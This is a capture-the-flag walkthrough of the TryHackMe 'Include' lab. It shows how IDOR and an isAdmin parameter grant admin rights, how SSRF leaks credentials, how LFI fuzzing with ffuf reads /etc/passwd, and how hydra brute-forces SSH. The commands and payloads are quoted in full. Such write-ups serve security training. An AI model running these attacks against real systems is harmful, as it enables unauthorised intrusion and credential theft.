+++
title = "Include - Web Pentesting - Tryhackme"
date = "2026-03-15"
author = "Silent Resistor"
+++

- Added `10.48.159.228 include.thm` to `/etc/hosts`
- Upon the nmap scan, we discovered there are two webservers running on the machine.
    ```sh
    #Nmap 7.95 scan initiated Sat Feb 28 07:26:57 2026 as: nmap -A -p4000,50000 -sC --script=*http-vuln* -oN include-new.nmap 10.48.159.228
    Nmap scan report for 10.48.159.228
    Host is up (0.024s latency).

    PORT      STATE SERVICE VERSION
    4000/tcp  open  http    Node.js (Express middleware)
    50000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Adtran 424RG FTTH gateway (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%), Synology DiskStation Manager 5.1 (Linux 3.2) (92%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 3 hops
    ```
- Directory enumeration on both webservers didn't yield any useful results.
- `http://include.thm:4000` - The creator is allowing me to sign in with guest/guest
- Upon signing in, I opened my profile with `http://include.thm:4000/friend/1`. I discovered that the website is vulnerable to IDOR.
- And I also discovered that it's allowing me to change the profile parameters including admin status. I just added `isAdmin=true` in the input fields and it worked. Now I am admin and I can see the Admin Settings option.
- We can also try here like `__proto__:{isAdmin:true}` to make everyone as admin. (Prototype pollution)
- Upon looking at the API option, it lists a few endpoints that reveal admin credentials.
- Upon looking at the Admin Settings, I found a file upload option. By inspecting the HTTP request using Burp, I get to know that the file upload is vulnerable to SSRF. I used the endpoints mentioned in the API as the URL parameter, and it worked, revealing the admin credentials.
- Used these admin credentials in `http://include.thm:50000/login.php` and I can see the first flag.
- Upon inspecting the source of `http://include.thm:50000/dashboard.php`, there is a picture included with the path `http://include.thm:50000/profile?img=profile.png`. And it's easy to suspect that this is vulnerable to LFI.
- So, I got the list of payloads from `https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/refs/heads/master/LFI%20payloads.txt`, and tried them all.
    ```bash
    curl -fsSL https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/refs/heads/master/LFI%20payloads.txt > lfipayload.txt
    ffuf -u http://include.thm:50000/profile.php?img=FUZZ -w payloads -H 'Cookie: PHPSESSID=vd4grnj98tqti28pc9lkc3dleu; connect.sid=s%3A5nvACvg5GVI-6f5cQxtCADkInn0mGaXp.9OzVoXF%2FllJgSXipRexPSF%2BZUG6sog6%2BtPrx%2Ffeu%2B8g' -mc 200 -fs 0
    ```
- It will reveal the file `/etc/passwd` with users: charles, joshua
- Let's brute force the SSH passwords for these users.
    ```bash
    hydra -l charles -P /usr/share/wordlists/rockyou.txt ssh://include.thm -I -t 4 # 123456
    hydra -l joshua -P /usr/share/wordlists/rockyou.txt ssh://include.thm -I -t 4 # 123456
    ```
- Get inside via SSH as charles or joshua and get the second flag from the `/var/www/html` directory.
